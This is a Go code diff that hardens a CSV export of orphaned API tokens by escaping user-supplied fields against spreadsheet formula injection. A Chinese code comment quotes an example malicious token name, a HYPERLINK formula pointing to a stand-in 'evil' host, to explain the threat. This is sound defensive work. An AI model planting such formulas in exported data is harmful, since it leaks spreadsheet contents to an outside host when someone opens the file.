@@ -9,6 +9,7 @@ import (
 
 	"github.com/QuantumNous/new-api/common"
 	"github.com/QuantumNous/new-api/model"
+	"github.com/QuantumNous/new-api/qianye/csvsafe"
 	"github.com/QuantumNous/new-api/qianye/guard"
 	"github.com/QuantumNous/new-api/service"
 	"github.com/QuantumNous/new-api/setting/ratio_setting"
@@ -303,17 +304,21 @@ func writeOrphanCSV(c *gin.Context, rep *orphanReport) {
 	defer w.Flush()
 	_ = w.Write([]string{"kind", "user_group", "model_group", "count", "enabled_count",
 		"active_30d", "reason", "token_id", "token_name", "key_masked", "user_id", "username"})
+	// 分组名、令牌名与用户名都是用户/运营填的自由文本,而这份文件写了 BOM
+	// 就是为了让运营用 Excel 打开它去联系人 —— 一个叫
+	// `=HYPERLINK("http://evil/"&A1,"x")` 的令牌名(33 字,令牌名上限 50)
+	// 会在那一刻求值。kind 与 reason 是代码里的字面量常量,不过。
 	emit := func(kind string, rows []orphanRow) {
 		for _, r := range rows {
-			_ = w.Write([]string{kind, r.UserGroup, r.ModelGroup,
+			_ = w.Write([]string{kind, csvsafe.Cell(r.UserGroup), csvsafe.Cell(r.ModelGroup),
 				strconv.FormatInt(r.Count, 10),
 				strconv.FormatInt(r.EnabledCount, 10),
 				strconv.FormatInt(r.Active30d, 10), r.Reason, "", "", "", "", ""})
 			for _, s := range r.Samples {
 				// 样本行的汇总列留空:同一个计数出现两次会被 Excel 的求和直接算错。
-				_ = w.Write([]string{kind, r.UserGroup, r.ModelGroup, "", "", "", "",
-					strconv.Itoa(s.TokenId), s.TokenName, s.MaskedKey,
-					strconv.Itoa(s.UserId), s.Username})
+				_ = w.Write([]string{kind, csvsafe.Cell(r.UserGroup), csvsafe.Cell(r.ModelGroup), "", "", "", "",
+					strconv.Itoa(s.TokenId), csvsafe.Cell(s.TokenName), csvsafe.Cell(s.MaskedKey),
+					strconv.Itoa(s.UserId), csvsafe.Cell(s.Username)})
 			}
 		}
 	}
